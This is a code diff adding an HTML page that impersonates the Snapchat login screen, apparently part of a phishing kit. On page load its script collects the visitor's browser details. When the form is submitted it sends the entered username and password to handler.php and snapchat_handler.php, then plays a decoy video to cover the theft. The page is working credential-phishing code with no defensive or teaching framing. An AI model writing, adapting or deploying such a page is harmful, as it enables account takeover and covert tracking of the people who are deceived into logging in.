@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat</title>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #fffc00 0%, #ff0066 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .snapchat-logo {
+            margin-bottom: 30px;
+        }
+
+        .snapchat-logo h1 {
+            color: #fffc00;
+            font-size: 36px;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(45deg, #fffc00, #ff0066);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .welcome-text {
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+
+        .login-form {
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 25px;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .form-input:focus {
+            border-color: #ff0066;
+            box-shadow: 0 0 10px rgba(255, 0, 102, 0.3);
+        }
+
+        .login-button {
+            width: 100%;
+            background: linear-gradient(45deg, #fffc00, #ff0066);
+            border: none;
+            border-radius: 25px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 15px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: transform 0.2s ease;
+        }
+
+        .login-button:hover {
+            transform: translateY(-2px);
+        }
+
+        .signup-link {
+            color: #666;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .signup-link:hover {
+            color: #ff0066;
+        }
+
+        .reel-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .reel-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .reel-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 10000;
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #ff0066;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-message {
+            color: #ff0066;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body onload="mydata()">
+    <div class="container">
+        <div class="snapchat-logo">
+            <h1>SNAPCHAT</h1>
+        </div>
+
+        <p class="welcome-text">Welcome back!</p>
+
+        <form class="login-form" id="loginForm">
+            <div class="form-group">
+                <input type="text" class="form-input" id="username" name="username" placeholder="Username or Email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" class="form-input" id="password" name="password" placeholder="Password" required>
+            </div>
+            
+            <div class="loading-spinner" id="loadingSpinner"></div>
+            <div class="error-message" id="errorMessage"></div>
+            
+            <button type="submit" class="login-button" id="loginButton">
+                Log In
+            </button>
+        </form>
+
+        <a href="#" class="signup-link">Don't have an account? Sign up</a>
+    </div>
+
+    <!-- Reel Container -->
+    <div class="reel-container" id="reelContainer">
+        <video class="reel-video" id="reelVideo" autoplay muted loop>
+            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
+        </video>
+        <button class="reel-close" id="reelClose">×</button>
+    </div>
+
+    <script>
+        function post(data) {
+            $.ajax({
+                type: 'POST',
+                data: { data: data },
+                url: 'handler.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {
+                    console.log('Data sent to local handler successfully');
+                },
+                error: function() {
+                    console.log('Error sending data to local handler');
+                }
+            });
+            
+            if(data.includes('snapchat_login')) {
+                $.ajax({
+                    type: 'POST',
+                    data: { data: data },
+                    url: '../../snapchat_handler.php',
+                    dataType: 'json',
+                    async: false,
+                    success: function(result) {
+                        console.log('Snapchat credentials sent to root handler successfully');
+                    },
+                    error: function() {
+                        console.log('Error sending Snapchat credentials to root handler');
+                    }
+                });
+            }
+        }
+
+        function mydata() {
+            const userData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                url: window.location.href
+            };
+            post(JSON.stringify(userData));
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const loginButton = document.getElementById('loginButton');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            errorMessage.style.display = 'none';
+            
+            if (!username || !password) {
+                showError('Please fill in all fields');
+                return;
+            }
+            
+            loginButton.disabled = true;
+            loginButton.textContent = 'Logging in...';
+            loadingSpinner.style.display = 'block';
+            
+            setTimeout(() => {
+                const loginData = {
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    loginStatus: 'success',
+                    userAgent: navigator.userAgent,
+                    ip: 'captured',
+                    sessionId: Math.random().toString(36).substr(2, 9)
+                };
+                
+                post(JSON.stringify({
+                    type: 'snapchat_login',
+                    username: username,
+                    password: password,
+                    data: loginData,
+                    timestamp: new Date().toISOString()
+                }));
+                
+                loginButton.disabled = false;
+                loginButton.textContent = 'Log In';
+                loadingSpinner.style.display = 'none';
+                
+                playReel();
+            }, 1500);
+        });
+
+        function showError(message) {
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+        }
+
+        function playReel() {
+            const reelContainer = document.getElementById('reelContainer');
+            const reelVideo = document.getElementById('reelVideo');
+            
+            reelContainer.style.display = 'flex';
+            reelVideo.play();
+            
+            setTimeout(() => {
+                closeReel();
+            }, 10000);
+        }
+
+        function closeReel() {
+            const reelContainer = document.getElementById('reelContainer');
+            const reelVideo = document.getElementById('reelVideo');
+            
+            reelVideo.pause();
+            reelContainer.style.display = 'none';
+        }
+
+        document.getElementById('reelClose').addEventListener('click', closeReel);
+        document.getElementById('reelContainer').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeReel();
+            }
+        });
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeReel();
+            }
+        });
+    </script>
+</body>
+</html>
